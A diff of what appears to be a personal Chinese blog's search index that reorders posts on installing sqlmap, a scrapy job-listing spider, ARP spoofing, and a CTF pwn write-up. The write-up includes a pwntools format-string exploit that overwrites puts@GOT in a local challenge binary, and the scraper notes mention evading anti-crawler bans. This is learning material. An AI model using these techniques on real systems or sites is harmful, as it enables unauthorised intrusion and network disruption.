@@ -1,58 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>MAC下 安装sqlmap教程</title>
-    <url>/2022/05/12/MAC%E4%B8%8B%20%E5%AE%89%E8%A3%85sqlmap%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[<p>通过不断在其他大佬们的blog中的学习，整理了一篇mac下 sqlmap的安装教程</p>
-<h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><ol>
-<li>Terminal 或者 Iterm </li>
-<li>Python 环境</li>
-</ol>
-<h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><ol>
-<li><p>先去github上面下载并解压sqlmap相关文件</p>
-<p>url：<a href="https://github.com/sqlmapproject/sqlmap.git">https://github.com/sqlmapproject/sqlmap.git</a></p>
-</li>
-<li><p>打开 Terminal(这里以terminal为例，因为terminal为系统自带终端)<br>输入 vi ~&#x2F;.bash_profile</p>
+    <title>[Pwn]2018年山东省科来杯Pwn题目Repeater复现</title>
+    <url>/2022/05/12/%5BPwn%5D2018%E5%B9%B4%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%A7%91%E6%9D%A5%E6%9D%AFPwn%E9%A2%98%E7%9B%AERepeater%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="2018年山东省科来杯Pwn题目Repeater复现"><a href="#2018年山东省科来杯Pwn题目Repeater复现" class="headerlink" title="2018年山东省科来杯Pwn题目Repeater复现"></a>2018年山东省科来杯Pwn题目Repeater复现</h1><h2 id="补充一点汇编语言基础知识"><a href="#补充一点汇编语言基础知识" class="headerlink" title="补充一点汇编语言基础知识"></a>补充一点汇编语言基础知识</h2><p>对于我这种对汇编语言不怎么感冒的人来说，补充一些相应的汇编语言的基础知识还是很重要的</p>
+<p>这里就针对本题中用到的汇编指令进行相应补充</p>
+<p>lea与mov的区别：lea eax,[ebx+8]就是将ebx+8这个值直接赋给eax (相当于把地址赋给eax)，而不是把ebx+8处的内存地址里的数据赋给eax。</p>
+<p>而mov指令则恰恰相反，例如：<br>mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax。</p>
+<p>cmp(compare)指令进行比较两个操作数的大小，若执行指令后ZF&#x3D;1<br>则说明两个数相等，因为zero为1说明结果为0。</p>
+<p>jnz结果不为零（或不相等）则转移，jz即零标志为1就跳转。<br>ZF汇编语言中的PSW标志寄存器中的一位，而JZ则是根据ZF决定是否跳转。<br>jz&#x3D;jump if zero，即零标志为1就跳转，一般与cmp连用，用以判断两数是否相等。jz的另一种写法就是je，je&#x3D;jump if equal，jz和je的作用是完全一样的。</p>
 <span id="more"></span>
-<p><img src="https://img-blog.csdnimg.cn/20191002103705232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>按 E 进行编辑</p>
-</li>
-</ol>
-<p>输入 alias sqlmap&#x3D;’python &#x2F;User&#x2F;***&#x2F;tools&#x2F;sqlmap-master&#x2F;sqlmap.py’</p>
-<p>此时 python后要根据自己所下载的sqlmap.py文件的具体位置来填写</p>
-<p>具体sqlmap.py文件的位置可以这样来找：打开所下载的sqlmap的文件夹后可以发现有sqlmap.py文件<br><img src="https://img-blog.csdnimg.cn/20191002103720670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>右键选择 拷贝sqlmap.py   此时的拷贝为拷贝的此sqlmap.py的文件的物理名，即文件的位置</p>
-<p>把上述指令中的python 后的地址全部删去后粘贴上刚刚复制的sqlmap.py的位置即可</p>
-<p>ps：要注意上述指令sqlmap&#x3D; 后 等号的前后不能有空格并且等号后面的位置要使用两个单引号扩起来(输入法在英文状态下的单引号)</p>
-<p>改完地址后 在export path 下一行 添加export  alias<br><img src="https://img-blog.csdnimg.cn/20191002103915123.png" alt="在这里插入图片描述"><br>添加完成后，按esc取消输入模式  再输入 : wq 按回车保存并退出到根目录</p>
-<ol start="3">
-<li>返回到根目录后输入指令 source ~&#x2F;.bash_profile  使bash重新载入配置令刚才命令生效</li>
-<li>一切完成后 在terminal中 输入 sqlmap启动</li>
-</ol>
-<p><img src="https://img-blog.csdnimg.cn/2019100210374111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>显示此界面即为搭建sqlmap环境成功</p>
-<p>开始你愉快的sql注入之旅吧 : )</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>scrapy quotesbot 源码分析</title>
-    <url>/2022/05/12/scrapy%20quotesbot%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<p>github：<a href="https://github.com/scrapy/quotesbot">https://github.com/scrapy/quotesbot</a></p>
-<p>Both spiders extract the same data from the same website, but toscrape-css employs CSS selectors, while toscrape-xpath employs XPath expressions.<br>根据readme描述，实例中一个为使用css语句写的，另一个为使用xpath语句写的</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">You can run a spider using the scrapy crawl command, such <span class="keyword">as</span>:</span><br><span class="line">$ scrapy crawl toscrape-css</span><br><span class="line"></span><br><span class="line">If you want to save the scraped data to a file, you can <span class="keyword">pass</span> the -o option:</span><br><span class="line">$ scrapy crawl toscrape-css -o quotes.json</span><br><span class="line"></span><br><span class="line">启动抓取并保存至本地json：scrapy crawl crawlname -o quotes.json</span><br></pre></td></tr></table></figure>
-<p>两个方法：<br>extract():这个方法返回的是一个<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E7%BB%84&spm=1001.2101.3001.7020">数组</a>list，，里面包含了多个string，如果只有一个string，则返回[‘ABC’]这样的形式。<br>extract_first()：这个方法返回的是一个string<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>，是list数组里面的第一个字符串。</p>
-<span id="more"></span>
-<p>声明：一下爬取网站均通过phpstudy放入了本地<br>官方实例spider源码：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ToScrapeSpiderXPath</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;toscrape-xpath&#x27;</span></span><br><span class="line">    start_urls = [</span><br><span class="line">       <span class="comment"># &#x27;http://quotes.toscrape.com/&#x27;,</span></span><br><span class="line">        <span class="string">&quot;http://localhost/qts.html&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="keyword">for</span> quote <span class="keyword">in</span> response.xpath(<span class="string">&#x27;//div[@class=&quot;quote&quot;]&#x27;</span>): <span class="comment">#通过源码分析得到，每一个块中的内容都属于一个quote，所以下面用&quot;//&quot;遍历所有的class为quote的div标签即可</span></span><br><span class="line">            <span class="keyword">yield</span> &#123;</span><br><span class="line">                <span class="string">&#x27;text&#x27;</span>: quote.xpath(<span class="string">&#x27;./span[@class=&quot;text&quot;]/text()&#x27;</span>).extract_first(),</span><br><span class="line">                <span class="string">&#x27;author&#x27;</span>: quote.xpath(<span class="string">&#x27;.//small[@class=&quot;author&quot;]/text()&#x27;</span>).extract_first(),</span><br><span class="line">                <span class="string">&#x27;tags&#x27;</span>: quote.xpath(<span class="string">&#x27;.//div[@class=&quot;tags&quot;]/a[@class=&quot;tag&quot;]/text()&#x27;</span>).extract()</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        next_page_url = response.xpath(<span class="string">&#x27;//li[@class=&quot;next&quot;]/a/@href&#x27;</span>).extract_first()  <span class="comment">#调用a标签的所有href属性</span></span><br><span class="line">        <span class="keyword">if</span> next_page_url <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(response.urljoin(next_page_url))  <span class="comment">#拼接主域名和子域名</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>练习写的某招聘单位职位爬取的spider源码：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BossSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&quot;witherc&quot;</span></span><br><span class="line">    <span class="comment">#allowed_domains = [&quot;https://www.zhipin.com/&quot;]  #允许爬取的域</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#with open(&#x27;/Users/w1therc/Desktop/「全国Python招聘」 - BOSS直聘.html&#x27;,&#x27;r&#x27;, encoding=&#x27;UTF8&#x27;) as url:</span></span><br><span class="line">    <span class="comment">#    start_urls = url</span></span><br><span class="line"></span><br><span class="line">    start_urls = [</span><br><span class="line">        <span class="string">&quot;http://localhost/boss.html&quot;</span></span><br><span class="line">        <span class="comment">#&quot;/Users/w1therc/Desktop/「全国Python招聘」 - BOSS直聘.html&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="keyword">for</span> quote <span class="keyword">in</span> response.xpath(<span class="string">&#x27;//div[@class=&quot;job-primary&quot;]&#x27;</span>):</span><br><span class="line">            <span class="keyword">yield</span> &#123;</span><br><span class="line">                <span class="string">&#x27;职位名称&#x27;</span>: quote.xpath(<span class="string">&#x27;.//span[@class=&quot;job-name&quot;]/a[@target=&quot;_blank&quot;]/text()&#x27;</span>).extract_first(),</span><br><span class="line">                <span class="string">&#x27;薪资&#x27;</span>: quote.xpath(<span class="string">&#x27;.//span[@class=&quot;red&quot;]/text()&#x27;</span>).extract_first(),</span><br><span class="line">                <span class="string">&#x27;工作地点&#x27;</span>: quote.xpath(<span class="string">&#x27;.//span[@class=&quot;job-area&quot;]/text()&#x27;</span>).extract()</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        下列三行用于网页跳转到下一页并爬取的代码没有问题，报错原因为：爬取页面保存在本地url为http://localhost/boss.html，但是跳转后的url变回了https://www.zhipin.com/c100010000-p100407/?page=2&amp;ka=page-2</span></span><br><span class="line"><span class="string">        此问题有待解决，可先实行但页面抓取</span></span><br><span class="line"><span class="string">        next_page_url = response.xpath(&#x27;//div[@class=&quot;page&quot;]/a[@class=&quot;next&quot;]/@href&#x27;).extract_first()  # 调用a标签的所有href属性</span></span><br><span class="line"><span class="string">        if next_page_url is not None:</span></span><br><span class="line"><span class="string">            yield scrapy.Request(response.urljoin(next_page_url))  # 拼接主域名和子域名</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>上述二者在解析结构时均使用的xpath语句</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">next_page_url = response.xpath(<span class="string">&#x27;//div[@class=&quot;page&quot;]/a[@class=&quot;next&quot;]/@href&#x27;</span>).extract_first()  <span class="comment"># 调用a标签的所有href属性</span></span><br><span class="line"><span class="keyword">if</span> next_page_url <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">yield</span> scrapy.Request(response.urljoin(next_page_url))  <span class="comment"># 拼接主域名和子域名</span></span><br></pre></td></tr></table></figure>
-<p>上述三行用于网页跳转到下一页并爬取的代码没有问题，报错原因为：爬取页面保存在本地url为<a href="http://localhost/boss.html">http://localhost/boss.html</a>，但是跳转后的url变回了<a href="https://www.zhipin.com/c100010000-p100407/?page=2&ka=page-2">https://www.zhipin.com/c100010000-p100407/?page=2&ka=page-2</a><br>        此问题有待解决，可先实行但页面抓取（目前想法：尝试保存多级页面到本地进行数据抓取，答辩时可说明情况，为了测试所以保存到本地，实际上可以通过成熟的代码来控制防止爬虫检测，直接用原url进行爬取并输出）<br><del>解决如何把爬取文件输出保存为xls文件：~~~~1、直接输出为csv文件(已解决)：scrapy crawl witherc -o 333.csv ~~<br>~~解决csv文件打开后乱码问题：在setting.py中添加代码</del><code>~~FEED_EXPORT_ENCODING = &#39;gb18030&#39;~~</code><del>即可</del><br><del>或者通过 安装openpyxl 并对pipeline.py进行配置</del></p>
-<p><del>第三部分设计：对一、二部分设计链接方法   即研究使用  pandas库中 pd.read_excel方法 对保存为excel文件中对数据进行处理 及 可视化输出等</del></p>
-<p><del>对csv可视化的思想：先把csv文件中的内容读取出来再进行可视化</del></p>
-<p><img src="/images/pasted-0.png" alt="upload successful"><br>报403是因为，通过上述代码获取的url为zhipin.com的原url，而非在本地localhost的url，此前访问时ip已被封，所以报错403</p>
-<p><del>转化为json文件，再做可视化，json文件中的数据是以dict存储的因此比较方便易用</del><br>数据格式方面：pyecharts 本质上在做的事情就是将 Echarts 的配置项由 Python dict 序列化为 JSON 格式，所以 pyecharts 支持什么格式的数据类型取决于 JSON 支持什么数据类型。</p>
+<h2 id="Repeater-WP"><a href="#Repeater-WP" class="headerlink" title="Repeater WP"></a>Repeater WP</h2><p>checksec 一下题目所给文件<br><img src="https://img-blog.csdnimg.cn/20201030103445340.png#pic_center" alt="在这里插入图片描述"><br>运行一下试试看<br><img src="https://img-blog.csdnimg.cn/20201030104011498.png#pic_center" alt="在这里插入图片描述"><br>好像看不出什么<br>测试一下格式化字符串漏洞<br><img src="https://img-blog.csdnimg.cn/20201030104054282.png#pic_center"><br>数一下 偏移为4<br>丢进ida看一下主程序<br>ctrl 1 看一下字符串，发现敏感字符串<br><img src="https://img-blog.csdnimg.cn/20201030104207828.png#pic_center" alt="在这里插入图片描述"><br>双击 ctrl x 跟进<br><img src="https://img-blog.csdnimg.cn/20201030104347614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以发现程序有call语句调用system，而system就是输出flag地址从而得到flag</p>
+<p>但是根据上面的汇编语句或者getflag字段内容可以发现这里存在一个判断语句<br><img src="https://img-blog.csdnimg.cn/20201030104723973.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030104802774.png#pic_center" alt="在这里插入图片描述"><br>2018h &#x3D; (8216)₁₀，判断 eax是否等于8216 ，ZF&#x3D;1则两数相等，相应的ZF&#x3D;1意味着结果为0，即jnz不跳转。随即执行将eax压入栈，再执行call语句调用，即可得到flag。</p>
+<p>根据偏移为4 编写exp脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./repeater&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./repeater&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;your msg:&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;puts_got:<span class="number">0x8048638</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行即可得到flag</p>
 ]]></content>
   </entry>
   <entry>
@@ -76,20 +38,26 @@
 ]]></content>
   </entry>
   <entry>
-    <title>[Pwn]2018年山东省科来杯Pwn题目Repeater复现</title>
-    <url>/2022/05/12/%5BPwn%5D2018%E5%B9%B4%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%A7%91%E6%9D%A5%E6%9D%AFPwn%E9%A2%98%E7%9B%AERepeater%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="2018年山东省科来杯Pwn题目Repeater复现"><a href="#2018年山东省科来杯Pwn题目Repeater复现" class="headerlink" title="2018年山东省科来杯Pwn题目Repeater复现"></a>2018年山东省科来杯Pwn题目Repeater复现</h1><h2 id="补充一点汇编语言基础知识"><a href="#补充一点汇编语言基础知识" class="headerlink" title="补充一点汇编语言基础知识"></a>补充一点汇编语言基础知识</h2><p>对于我这种对汇编语言不怎么感冒的人来说，补充一些相应的汇编语言的基础知识还是很重要的</p>
-<p>这里就针对本题中用到的汇编指令进行相应补充</p>
-<p>lea与mov的区别：lea eax,[ebx+8]就是将ebx+8这个值直接赋给eax (相当于把地址赋给eax)，而不是把ebx+8处的内存地址里的数据赋给eax。</p>
-<p>而mov指令则恰恰相反，例如：<br>mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax。</p>
-<p>cmp(compare)指令进行比较两个操作数的大小，若执行指令后ZF&#x3D;1<br>则说明两个数相等，因为zero为1说明结果为0。</p>
-<p>jnz结果不为零（或不相等）则转移，jz即零标志为1就跳转。<br>ZF汇编语言中的PSW标志寄存器中的一位，而JZ则是根据ZF决定是否跳转。<br>jz&#x3D;jump if zero，即零标志为1就跳转，一般与cmp连用，用以判断两数是否相等。jz的另一种写法就是je，je&#x3D;jump if equal，jz和je的作用是完全一样的。</p>
+    <title>scrapy quotesbot 源码分析</title>
+    <url>/2022/05/12/scrapy%20quotesbot%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<p>github：<a href="https://github.com/scrapy/quotesbot">https://github.com/scrapy/quotesbot</a></p>
+<p>Both spiders extract the same data from the same website, but toscrape-css employs CSS selectors, while toscrape-xpath employs XPath expressions.<br>根据readme描述，实例中一个为使用css语句写的，另一个为使用xpath语句写的</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">You can run a spider using the scrapy crawl command, such <span class="keyword">as</span>:</span><br><span class="line">$ scrapy crawl toscrape-css</span><br><span class="line"></span><br><span class="line">If you want to save the scraped data to a file, you can <span class="keyword">pass</span> the -o option:</span><br><span class="line">$ scrapy crawl toscrape-css -o quotes.json</span><br><span class="line"></span><br><span class="line">启动抓取并保存至本地json：scrapy crawl crawlname -o quotes.json</span><br></pre></td></tr></table></figure>
+<p>两个方法：<br>extract():这个方法返回的是一个<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E7%BB%84&spm=1001.2101.3001.7020">数组</a>list，，里面包含了多个string，如果只有一个string，则返回[‘ABC’]这样的形式。<br>extract_first()：这个方法返回的是一个string<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>，是list数组里面的第一个字符串。</p>
 <span id="more"></span>
-<h2 id="Repeater-WP"><a href="#Repeater-WP" class="headerlink" title="Repeater WP"></a>Repeater WP</h2><p>checksec 一下题目所给文件<br><img src="https://img-blog.csdnimg.cn/20201030103445340.png#pic_center" alt="在这里插入图片描述"><br>运行一下试试看<br><img src="https://img-blog.csdnimg.cn/20201030104011498.png#pic_center" alt="在这里插入图片描述"><br>好像看不出什么<br>测试一下格式化字符串漏洞<br><img src="https://img-blog.csdnimg.cn/20201030104054282.png#pic_center"><br>数一下 偏移为4<br>丢进ida看一下主程序<br>ctrl 1 看一下字符串，发现敏感字符串<br><img src="https://img-blog.csdnimg.cn/20201030104207828.png#pic_center" alt="在这里插入图片描述"><br>双击 ctrl x 跟进<br><img src="https://img-blog.csdnimg.cn/20201030104347614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以发现程序有call语句调用system，而system就是输出flag地址从而得到flag</p>
-<p>但是根据上面的汇编语句或者getflag字段内容可以发现这里存在一个判断语句<br><img src="https://img-blog.csdnimg.cn/20201030104723973.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030104802774.png#pic_center" alt="在这里插入图片描述"><br>2018h &#x3D; (8216)₁₀，判断 eax是否等于8216 ，ZF&#x3D;1则两数相等，相应的ZF&#x3D;1意味着结果为0，即jnz不跳转。随即执行将eax压入栈，再执行call语句调用，即可得到flag。</p>
-<p>根据偏移为4 编写exp脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./repeater&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./repeater&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;your msg:&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;puts_got:<span class="number">0x8048638</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>运行即可得到flag</p>
+<p>声明：一下爬取网站均通过phpstudy放入了本地<br>官方实例spider源码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ToScrapeSpiderXPath</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;toscrape-xpath&#x27;</span></span><br><span class="line">    start_urls = [</span><br><span class="line">       <span class="comment"># &#x27;http://quotes.toscrape.com/&#x27;,</span></span><br><span class="line">        <span class="string">&quot;http://localhost/qts.html&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="keyword">for</span> quote <span class="keyword">in</span> response.xpath(<span class="string">&#x27;//div[@class=&quot;quote&quot;]&#x27;</span>): <span class="comment">#通过源码分析得到，每一个块中的内容都属于一个quote，所以下面用&quot;//&quot;遍历所有的class为quote的div标签即可</span></span><br><span class="line">            <span class="keyword">yield</span> &#123;</span><br><span class="line">                <span class="string">&#x27;text&#x27;</span>: quote.xpath(<span class="string">&#x27;./span[@class=&quot;text&quot;]/text()&#x27;</span>).extract_first(),</span><br><span class="line">                <span class="string">&#x27;author&#x27;</span>: quote.xpath(<span class="string">&#x27;.//small[@class=&quot;author&quot;]/text()&#x27;</span>).extract_first(),</span><br><span class="line">                <span class="string">&#x27;tags&#x27;</span>: quote.xpath(<span class="string">&#x27;.//div[@class=&quot;tags&quot;]/a[@class=&quot;tag&quot;]/text()&#x27;</span>).extract()</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        next_page_url = response.xpath(<span class="string">&#x27;//li[@class=&quot;next&quot;]/a/@href&#x27;</span>).extract_first()  <span class="comment">#调用a标签的所有href属性</span></span><br><span class="line">        <span class="keyword">if</span> next_page_url <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(response.urljoin(next_page_url))  <span class="comment">#拼接主域名和子域名</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>练习写的某招聘单位职位爬取的spider源码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BossSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&quot;witherc&quot;</span></span><br><span class="line">    <span class="comment">#allowed_domains = [&quot;https://www.zhipin.com/&quot;]  #允许爬取的域</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#with open(&#x27;/Users/w1therc/Desktop/「全国Python招聘」 - BOSS直聘.html&#x27;,&#x27;r&#x27;, encoding=&#x27;UTF8&#x27;) as url:</span></span><br><span class="line">    <span class="comment">#    start_urls = url</span></span><br><span class="line"></span><br><span class="line">    start_urls = [</span><br><span class="line">        <span class="string">&quot;http://localhost/boss.html&quot;</span></span><br><span class="line">        <span class="comment">#&quot;/Users/w1therc/Desktop/「全国Python招聘」 - BOSS直聘.html&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="keyword">for</span> quote <span class="keyword">in</span> response.xpath(<span class="string">&#x27;//div[@class=&quot;job-primary&quot;]&#x27;</span>):</span><br><span class="line">            <span class="keyword">yield</span> &#123;</span><br><span class="line">                <span class="string">&#x27;职位名称&#x27;</span>: quote.xpath(<span class="string">&#x27;.//span[@class=&quot;job-name&quot;]/a[@target=&quot;_blank&quot;]/text()&#x27;</span>).extract_first(),</span><br><span class="line">                <span class="string">&#x27;薪资&#x27;</span>: quote.xpath(<span class="string">&#x27;.//span[@class=&quot;red&quot;]/text()&#x27;</span>).extract_first(),</span><br><span class="line">                <span class="string">&#x27;工作地点&#x27;</span>: quote.xpath(<span class="string">&#x27;.//span[@class=&quot;job-area&quot;]/text()&#x27;</span>).extract()</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        下列三行用于网页跳转到下一页并爬取的代码没有问题，报错原因为：爬取页面保存在本地url为http://localhost/boss.html，但是跳转后的url变回了https://www.zhipin.com/c100010000-p100407/?page=2&amp;ka=page-2</span></span><br><span class="line"><span class="string">        此问题有待解决，可先实行但页面抓取</span></span><br><span class="line"><span class="string">        next_page_url = response.xpath(&#x27;//div[@class=&quot;page&quot;]/a[@class=&quot;next&quot;]/@href&#x27;).extract_first()  # 调用a标签的所有href属性</span></span><br><span class="line"><span class="string">        if next_page_url is not None:</span></span><br><span class="line"><span class="string">            yield scrapy.Request(response.urljoin(next_page_url))  # 拼接主域名和子域名</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>上述二者在解析结构时均使用的xpath语句</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">next_page_url = response.xpath(<span class="string">&#x27;//div[@class=&quot;page&quot;]/a[@class=&quot;next&quot;]/@href&#x27;</span>).extract_first()  <span class="comment"># 调用a标签的所有href属性</span></span><br><span class="line"><span class="keyword">if</span> next_page_url <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">yield</span> scrapy.Request(response.urljoin(next_page_url))  <span class="comment"># 拼接主域名和子域名</span></span><br></pre></td></tr></table></figure>
+<p>上述三行用于网页跳转到下一页并爬取的代码没有问题，报错原因为：爬取页面保存在本地url为<a href="http://localhost/boss.html">http://localhost/boss.html</a>，但是跳转后的url变回了<a href="https://www.zhipin.com/c100010000-p100407/?page=2&ka=page-2">https://www.zhipin.com/c100010000-p100407/?page=2&ka=page-2</a><br>        此问题有待解决，可先实行但页面抓取（目前想法：尝试保存多级页面到本地进行数据抓取，答辩时可说明情况，为了测试所以保存到本地，实际上可以通过成熟的代码来控制防止爬虫检测，直接用原url进行爬取并输出）<br><del>解决如何把爬取文件输出保存为xls文件：~~~~1、直接输出为csv文件(已解决)：scrapy crawl witherc -o 333.csv ~~<br>~~解决csv文件打开后乱码问题：在setting.py中添加代码</del><code>~~FEED_EXPORT_ENCODING = &#39;gb18030&#39;~~</code><del>即可</del><br><del>或者通过 安装openpyxl 并对pipeline.py进行配置</del></p>
+<p><del>第三部分设计：对一、二部分设计链接方法   即研究使用  pandas库中 pd.read_excel方法 对保存为excel文件中对数据进行处理 及 可视化输出等</del></p>
+<p><del>对csv可视化的思想：先把csv文件中的内容读取出来再进行可视化</del></p>
+<p><img src="/images/pasted-0.png" alt="upload successful"><br>报403是因为，通过上述代码获取的url为zhipin.com的原url，而非在本地localhost的url，此前访问时ip已被封，所以报错403</p>
+<p><del>转化为json文件，再做可视化，json文件中的数据是以dict存储的因此比较方便易用</del><br>数据格式方面：pyecharts 本质上在做的事情就是将 Echarts 的配置项由 Python dict 序列化为 JSON 格式，所以 pyecharts 支持什么格式的数据类型取决于 JSON 支持什么数据类型。</p>
 ]]></content>
   </entry>
   <entry>
@@ -149,6 +117,38 @@
 </ol>
 <p><img src="https://img-blog.csdnimg.cn/20191002103343711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h1><p>最后说一下此arp断网欺骗仅适用于同局域网下的主机间</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>MAC下 安装sqlmap教程</title>
+    <url>/2022/05/12/MAC%E4%B8%8B%20%E5%AE%89%E8%A3%85sqlmap%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<p>通过不断在其他大佬们的blog中的学习，整理了一篇mac下 sqlmap的安装教程</p>
